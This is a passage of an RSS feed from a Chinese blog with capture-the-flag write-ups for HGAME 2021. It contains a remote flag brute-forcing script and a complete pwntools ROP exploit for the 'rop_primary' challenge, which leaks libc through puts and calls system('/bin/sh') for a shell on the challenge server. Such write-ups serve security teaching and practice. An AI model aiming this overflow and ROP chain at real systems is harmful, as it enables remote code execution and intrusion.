&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;def&lt;/span&gt; &lt;span style="color:#06287e"&gt;get_next&lt;/span&gt;(flag_now):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh &lt;span style="color:#666"&gt;=&lt;/span&gt; remote(&lt;span style="color:#4070a0"&gt;&amp;#34;101.132.177.131&amp;#34;&lt;/span&gt;,&lt;span style="color:#40a070"&gt;9999&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#666"&gt;=&lt;/span&gt; flag_now &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#34;now!&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; i &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; &lt;span style="color:#007020"&gt;range&lt;/span&gt;(&lt;span style="color:#40a070"&gt;2&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#007020"&gt;len&lt;/span&gt;(flag_now) &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#40a070"&gt;2&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#34;---&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#39;ebx: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; code &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#007020"&gt;int&lt;/span&gt;(sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;return&lt;/span&gt; code
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;flag &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;hgame{You_Kn0w_debuG&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;while&lt;/span&gt;(flag[&lt;span style="color:#666"&gt;-&lt;/span&gt;&lt;span style="color:#40a070"&gt;1&lt;/span&gt;] &lt;span style="color:#666"&gt;!=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;}&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mapping &lt;span style="color:#666"&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; charac &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; total_char:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mapping[test(flag &lt;span style="color:#666"&gt;+&lt;/span&gt; charac)] &lt;span style="color:#666"&gt;=&lt;/span&gt; charac
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#60a0b0;font-style:italic"&gt;#print(str(test(charac)) + &amp;#39;:&amp;#39; + charac + &amp;#39;=&amp;gt;&amp;#39; + mapping[test(charac)])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#666"&gt;+=&lt;/span&gt; mapping[get_next(flag)]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020"&gt;print&lt;/span&gt; flag
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020"&gt;print&lt;/span&gt; flag
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分了几次爆破，所以这个脚本的起点就几乎是 &lt;code&gt;flag&lt;/code&gt; 了&lt;/p&gt;</description></item><item><title>HGAME2021-WEEK2-PWN-WP</title><link>https://chujdk.github.io/wp/1079.html</link><pubDate>Tue, 09 Feb 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1079.html</guid><description>&lt;h3 id="rop_primary"&gt;rop_primary&lt;/h3&gt;
&lt;p&gt;没什么难度，就是单纯的 ROP&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;# coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;from&lt;/span&gt; &lt;span style="color:#0e84b5;font-weight:bold"&gt;pwn&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;import&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;from&lt;/span&gt; &lt;span style="color:#0e84b5;font-weight:bold"&gt;LibcSearcher&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;import&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;import&lt;/span&gt; &lt;span style="color:#0e84b5;font-weight:bold"&gt;re&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;elf &lt;span style="color:#666"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#4070a0"&gt;&amp;#34;./rop_primary&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_rdi_ret &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x401613&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_rsi_r15_ret &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x401611&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_r14_r15_ret &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x401610&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;def&lt;/span&gt; &lt;span style="color:#06287e"&gt;matrixMul&lt;/span&gt;(A, B):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;if&lt;/span&gt; &lt;span style="color:#007020"&gt;len&lt;/span&gt;(A[&lt;span style="color:#40a070"&gt;0&lt;/span&gt;]) &lt;span style="color:#666"&gt;==&lt;/span&gt; &lt;span style="color:#007020"&gt;len&lt;/span&gt;(B):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#666"&gt;=&lt;/span&gt; [[&lt;span style="color:#40a070"&gt;0&lt;/span&gt;] &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#007020"&gt;len&lt;/span&gt;(B[&lt;span style="color:#40a070"&gt;0&lt;/span&gt;]) &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; i &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; &lt;span style="color:#007020"&gt;range&lt;/span&gt;(&lt;span style="color:#007020"&gt;len&lt;/span&gt;(A))]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; i &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; &lt;span style="color:#007020"&gt;range&lt;/span&gt;(&lt;span style="color:#007020"&gt;len&lt;/span&gt;(A)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; j &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; &lt;span style="color:#007020"&gt;range&lt;/span&gt;(&lt;span style="color:#007020"&gt;len&lt;/span&gt;(B[&lt;span style="color:#40a070"&gt;0&lt;/span&gt;])):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; k &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; &lt;span style="color:#007020"&gt;range&lt;/span&gt;(&lt;span style="color:#007020"&gt;len&lt;/span&gt;(B)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res[i][j] &lt;span style="color:#666"&gt;+=&lt;/span&gt; &lt;span style="color:#007020"&gt;int&lt;/span&gt;(A[i][k]) &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#007020"&gt;int&lt;/span&gt;(B[k][j])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;return&lt;/span&gt; res
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh &lt;span style="color:#666"&gt;=&lt;/span&gt; remote(&lt;span style="color:#4070a0"&gt;&amp;#34;159.75.104.107&amp;#34;&lt;/span&gt;,&lt;span style="color:#40a070"&gt;30372&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;A:&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;matA &lt;span style="color:#666"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;matB &lt;span style="color:#666"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;while&lt;/span&gt; &lt;span style="color:#40a070"&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; number_string &lt;span style="color:#666"&gt;=&lt;/span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,drop &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;if&lt;/span&gt;(number_string &lt;span style="color:#666"&gt;==&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;B:&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; matA&lt;span style="color:#666"&gt;.&lt;/span&gt;append(re&lt;span style="color:#666"&gt;.&lt;/span&gt;findall(&lt;span style="color:#4070a0"&gt;r&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;\d+\.?\d*&amp;#34;&lt;/span&gt;,number_string))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;while&lt;/span&gt; &lt;span style="color:#40a070"&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; number_string &lt;span style="color:#666"&gt;=&lt;/span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,drop &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;if&lt;/span&gt;(number_string &lt;span style="color:#666"&gt;==&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;a * b = ?&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; matB&lt;span style="color:#666"&gt;.&lt;/span&gt;append(re&lt;span style="color:#666"&gt;.&lt;/span&gt;findall(&lt;span style="color:#4070a0"&gt;r&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;\d+\.?\d*&amp;#34;&lt;/span&gt;,number_string))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;matAns &lt;span style="color:#666"&gt;=&lt;/span&gt; matrixMul(matA,matB)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020"&gt;print&lt;/span&gt; matAns
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; i &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; matAns:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; j &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; i:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendline(&lt;span style="color:#007020"&gt;str&lt;/span&gt;(j))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;best&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x30&lt;/span&gt; &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#40a070"&gt;8&lt;/span&gt; &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(pop_rdi_ret) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(elf&lt;span style="color:#666"&gt;.&lt;/span&gt;got[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(elf&lt;span style="color:#666"&gt;.&lt;/span&gt;symbols[&lt;span style="color:#4070a0"&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;]) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0x40157B&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendline(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;leak_addr &lt;span style="color:#666"&gt;=&lt;/span&gt; u64(sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recv(&lt;span style="color:#40a070"&gt;6&lt;/span&gt;)&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;8&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;log&lt;span style="color:#666"&gt;.&lt;/span&gt;success(&lt;span style="color:#4070a0"&gt;&amp;#34;addr:&amp;#34;&lt;/span&gt; &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#007020"&gt;hex&lt;/span&gt;(leak_addr))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc &lt;span style="color:#666"&gt;=&lt;/span&gt; LibcSearcher(&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;,leak_addr)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc_base &lt;span style="color:#666"&gt;=&lt;/span&gt; leak_addr &lt;span style="color:#666"&gt;-&lt;/span&gt; libc&lt;span style="color:#666"&gt;.&lt;/span&gt;dump(&lt;span style="color:#4070a0"&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;log&lt;span style="color:#666"&gt;.&lt;/span&gt;success(&lt;span style="color:#4070a0"&gt;&amp;#34;libc_base:&amp;#34;&lt;/span&gt; &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#007020"&gt;hex&lt;/span&gt;(libc_base))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;system_addr &lt;span style="color:#666"&gt;=&lt;/span&gt; libc_base &lt;span style="color:#666"&gt;+&lt;/span&gt; libc&lt;span style="color:#666"&gt;.&lt;/span&gt;dump(&lt;span style="color:#4070a0"&gt;&amp;#34;system&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;bin_sh_addr &lt;span style="color:#666"&gt;=&lt;/span&gt; libc_base &lt;span style="color:#666"&gt;+&lt;/span&gt; libc&lt;span style="color:#666"&gt;.&lt;/span&gt;dump(&lt;span style="color:#4070a0"&gt;&amp;#39;str_bin_sh&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x30&lt;/span&gt; &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#40a070"&gt;8&lt;/span&gt; &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(pop_r14_r15_ret) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0&lt;/span&gt;) &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#40a070"&gt;2&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;+=&lt;/span&gt; p64(pop_rdi_ret) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(bin_sh_addr) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(system_addr)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#39;best&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒&lt;/p&gt;</description></item><item><title>HGAME2021-WEAK1-WP</title><link>https://chujdk.github.io/wp/1044.html</link><pubDate>Sun, 07 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1044.html</guid><description>&lt;p&gt;许久没有更新博客了，主要是因为最近都在打 &lt;code&gt;hgame&lt;/code&gt;，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的合集。bin 的题是都解出来了，别的方向大概也就做了做签到，应该说是真的不会，最后的总分是真的不怎么好看，pwn手心里苦啊。&lt;/p&gt;</description></item></channel></rss>